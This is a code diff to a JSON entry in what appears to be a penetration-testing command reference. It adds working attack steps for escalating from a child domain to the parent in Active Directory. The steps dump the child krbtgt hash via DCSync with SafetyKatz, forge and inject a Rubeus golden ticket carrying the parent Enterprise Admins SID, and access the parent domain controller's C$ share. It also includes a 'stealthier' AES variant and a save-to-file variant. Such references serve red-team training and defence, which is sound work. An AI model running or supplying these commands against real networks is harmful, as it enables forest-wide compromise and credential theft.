@@ -80,5 +80,29 @@
   },
   "tools": [
     "Rubeus"
+  ],
+  "variations": [
+    {
+      "label": "AES256 (stealthier than RC4)",
+      "command": ".\\Rubeus.exe golden /aes256:<child_krbtgt_aes> /domain:<child_domain> /sid:<child_sid> /sids:<parent_ea_sid> /user:Administrator /ptt"
+    },
+    {
+      "label": "Save ticket to file",
+      "command": ".\\Rubeus.exe golden /rc4:<child_krbtgt_hash> /domain:<child_domain> /sid:<child_sid> /sids:<parent_ea_sid> /user:Administrator /outfile:golden.kirbi"
+    }
+  ],
+  "steps": [
+    {
+      "label": "DCSync child krbtgt",
+      "command": "SafetyKatz.exe \"lsadump::dcsync /user:<child_domain>\\krbtgt\" \"exit\""
+    },
+    {
+      "label": "Forge + inject with EA SID history",
+      "command": ".\\Rubeus.exe golden /rc4:<hash> /domain:<child_domain> /sid:<child_sid> /sids:<parent_ea_sid> /user:Administrator /ptt"
+    },
+    {
+      "label": "Access parent DC",
+      "command": "dir \\\\<parent_dc>\\C$"
+    }
   ]
 }
